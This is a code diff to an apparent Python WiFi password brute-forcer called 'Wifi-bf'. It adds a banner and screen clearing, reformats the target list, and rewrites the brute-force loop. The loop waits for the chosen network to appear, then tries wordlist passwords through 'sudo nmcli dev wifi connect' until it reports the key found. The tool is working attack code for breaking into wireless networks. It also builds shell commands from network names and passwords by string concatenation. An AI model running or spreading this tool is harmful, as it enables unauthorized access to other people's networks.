@@ -7,6 +7,24 @@ import time
 
 # service NetworkManager restart
 
+def cls():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+def header():
+    print('''
+==============================================================
+	██╗    ██╗██╗███████╗██╗      ██████╗ ███████╗
+	██║    ██║██║██╔════╝██║      ██╔══██╗██╔════╝
+	██║ █╗ ██║██║█████╗  ██║█████╗██████╔╝█████╗  
+	██║███╗██║██║██╔══╝  ██║╚════╝██╔══██╗██╔══╝  
+	╚███╔███╔╝██║██║     ██║      ██████╔╝██║     
+	 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝     
+                                     
+                 https://github.com/flancast90
+                         By: BLUND3R                 
+==============================================================
+    
+    ''')
 
 class bcolors:
     HEADER = '\033[95m'
@@ -85,26 +103,25 @@ def require_root():
 
 
 def display_targets(networks, security_type):
-	print("Select a target: \n")
+    print("Select a target: \n")
     
-	rows, columns = os.popen('stty size', 'r').read().split()
-	for i in range(len(networks)):
-		width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
-		spacer = " "
-		
-		if (int(columns) >= 100):
-			calc = int((int(columns)-int(width))*0.75)
-		else:
-    			calc = int(columns)-int(width)
-    	
-		for index in range(calc):
-			spacer += "."
-			if index == (calc-1):
-				spacer += " "
-	    	
-		print(str(i+1)+". "+networks[i]+spacer+security_type[i])
+    rows, columns = os.popen('stty size', 'r').read().split()
+    for i in range(len(networks)):
+        width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
+        spacer = " "
 
-
+        if (int(columns) >= 100):
+            calc = int((int(columns)-int(width))*0.75)
+        else:
+            calc = int(columns)-int(width)
+            
+        for index in range(calc):
+            spacer += "."
+            if index == (calc-1):
+                spacer += " "
+                
+        print(str(i+1)+". "+networks[i]+spacer+security_type[i])
+        
 """
 	This functions prompt the user to enter the target choice and returns the choice.
 	The function runs in a loop until the user enter the correct target
@@ -144,19 +161,29 @@ def brute_force(selected_network, passwords, args):
                 decoded_line+"'"+bcolors.ENDC)
 
         if (len(decoded_line) >= 8):
-            time.sleep(3)
+            contain = False
+            
+            while contain == False:
+                available = os.popen("nmcli -f SSID dev wifi").read()
+                available = available.split('\n')
+                available = [item.strip() for item in available]
+            
+                if selected_network in available:
+                    contain = True
+                else:
+                    time.sleep(1)
 
-            creds = os.popen("sudo nmcli dev wifi connect " +
-                selected_network+" password "+decoded_line).read()
+            creds = os.popen("sudo nmcli dev wifi connect \""+
+                selected_network+"\" password \""+decoded_line+"\"").read()
                 
             # print(creds)
 
             if ("Error:" in creds.strip()):
-            	if args.verbose is True:
+                if args.verbose is True:
                     print(bcolors.FAIL+"** TESTING **: password '" +
                         decoded_line+"' failed."+bcolors.ENDC)
             else:
-            	sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
+                sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
                     decoded_line+"' succeeded."+bcolors.ENDC)
         else:
             if args.verbose is True:
@@ -172,6 +199,8 @@ def brute_force(selected_network, passwords, args):
 
 
 def main():
+    cls()
+    header()
     require_root()
     args = argument_parser()
 
@@ -204,6 +233,9 @@ def main():
     max = len(networks)
     pick = prompt_for_target_choice(max)
     target = networks[pick]
+    
+    cls()
+    header()
     
     print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")
 
